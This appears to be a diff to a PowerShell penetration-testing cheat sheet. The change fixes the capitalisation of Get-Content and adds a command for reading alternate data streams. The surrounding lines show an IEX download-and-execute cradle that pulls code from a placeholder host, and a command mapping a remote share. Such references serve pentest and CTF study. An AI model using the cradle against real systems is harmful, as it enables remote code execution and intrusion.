@@ -563,7 +563,10 @@ IEX/New-Object Net.WebClient().downloadString('http://IP_here/path/to/file')
 IEX(New-Object Net.WebClient).downloadString('http://IP_here/path/to/file')
 
 # read text file
-get-content file_name-here
+Get-Content file_name-here
+
+# read alternate data stream
+Get-Content file_name_here -Stream ads_name_here
 
 # connect to share
 New-PSDrive -Name "drive_name_here" -PSProvider "FileSystem" -Root "\\IP_here\share_name_here"
